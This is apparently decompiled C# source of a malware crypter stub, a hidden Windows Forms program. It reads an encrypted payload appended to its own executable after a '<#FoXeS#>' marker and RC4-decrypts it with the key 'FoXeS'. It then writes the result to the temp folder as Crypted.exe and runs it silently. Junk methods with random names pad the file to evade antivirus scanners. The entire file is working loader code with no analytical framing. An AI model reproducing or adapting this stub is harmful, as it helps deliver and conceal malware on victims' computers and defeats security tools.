using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Welp;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	private const string string_0 = "<#FoXeS#>";

	[DebuggerNonUserCode]
	public Form1()
	{
		Class7.wLG3NXYzoYMJd();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((Control)this).set_AccessibleDescription((string)null);
		((Control)this).set_AccessibleName((string)null);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)this).set_BackgroundImage((Image)null);
		((Control)this).set_Cursor(Cursors.get_Cross());
		((Control)this).set_DoubleBuffered(true);
		((Control)this).set_Font((Font)null);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_HelpButton(true);
		((Form)this).set_Icon((Icon)null);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string tempPath = default(string);
		string text = default(string);
		string[] array = default(string[]);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 309:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_0047;
						case 7:
							goto IL_005d;
						case 8:
							goto IL_006f;
						case 9:
							goto IL_0081;
						case 10:
							goto IL_009a;
						case 11:
							goto IL_00af;
						case 12:
							goto IL_00c6;
						case 13:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 14:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00c6:
					num = 12;
					Process.Start(tempPath + "\\Crypted.exe");
					break;
					IL_00af:
					num = 11;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_00c6;
					IL_0009:
					num = 2;
					tempPath = Path.GetTempPath();
					goto IL_0011;
					IL_0011:
					num = 3;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_0023;
					IL_0023:
					num = 4;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_0033;
					IL_0033:
					num = 5;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_0047;
					IL_0047:
					num = 6;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_005d;
					IL_005d:
					num = 7;
					array = Strings.Split(text, "<#FoXeS#>", -1, (CompareMethod)0);
					goto IL_006f;
					IL_006f:
					num = 8;
					text2 = rc4(array[1], "FoXeS");
					goto IL_0081;
					IL_0081:
					num = 9;
					FileSystem.FileOpen(5, tempPath + "\\Crypted.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_009a;
					IL_009a:
					num = 10;
					FileSystem.FilePut(5, text2, -1L, false);
					goto IL_00af;
					end_IL_0001_2:
					break;
				}
				num = 13;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 309;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void JuNk_pnOnnunaLVhcIyShDuC1050500177()
	{
		new decimal(-1380661673L);
		for (int i = 7607236; i <= 0; i = checked(i + 1))
		{
		}
		new decimal(2461246L);
	}

	public void JuNk_SdKhRbPtim790513734()
	{
		new decimal(1691426717L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(-1351023469L);
			ProjectData.ClearProjectError();
		}
		new decimal(787186939L);
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(1415379379L);
			new decimal(423496510L);
			ProjectData.ClearProjectError();
		}
		new decimal(409127218L);
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		for (int i = 8262255; i <= 6724276; i = checked(i + 1))
		{
			new decimal(1740266585L);
			try
			{
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void JuNk_KaTdO544651613()
	{
		int num = 4898304;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 6808194);
	}

	private object method_0(string string_1, string string_2)
	{
		int num = 0;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 76846);
		return "OyjCBpobs";
	}

	public void JuNk_dvuVDkrWiRVMEasrPVF141552421()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(-316012830L);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			new decimal(-2027151112L);
			ProjectData.ClearProjectError();
		}
		new decimal(-675430301L);
		try
		{
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			new decimal(-1793950525L);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	public static string rc4(string message, string password)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = password.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = password.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	public object TTchHKIBFTUcBXPClSHBxMMVpCQTFQ(int MJdSAYRFLVYdwVwpvAOFWHTFVIvMMg, int FYTBtnBtaMMQAFMHScSUEqNBuELN, string WTSWSCaMoqMUaXDEDRJLhvIHbEIVIgJ)
	{
		int num = 0;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 99912);
			int num2 = 0;
			do
			{
				num2++;
			}
			while (num2 <= 66087);
			return "sKh";
		}
	}

	public object eJPRRUWHKgPMrDFXVQkKCrOsXOv(string bLDJDIyPDxTISLqvXGITQciKAoLtSTY)
	{
		int num = 0;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 8842);
		return "ALmU";
	}
}
